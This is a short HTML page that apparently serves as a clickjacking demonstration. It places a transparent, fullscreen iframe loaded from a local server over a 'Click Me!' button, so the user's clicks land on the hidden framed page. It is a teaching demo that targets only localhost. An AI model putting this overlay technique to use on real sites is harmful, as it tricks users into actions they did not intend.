<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Clickjacking</title>
  </head>
  <body>
    <h1>Clickjacking</h1>
    <p>Click the button below to see Clickjacking demonstration.</p>

    <button id="overlay-button">Click Me!</button><br /><br />

    <iframe src="http://localhost:5011/iframe1" id="legit-iframe"></iframe>

    <style>
      #legit-iframe {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 1;
        opacity: 0;
      }
    </style>

    <script>
      document
        .getElementById("overlay-button")
        .addEventListener("click", () => {
          alert("Button clicked");
        });
    </script>
  </body>
</html>
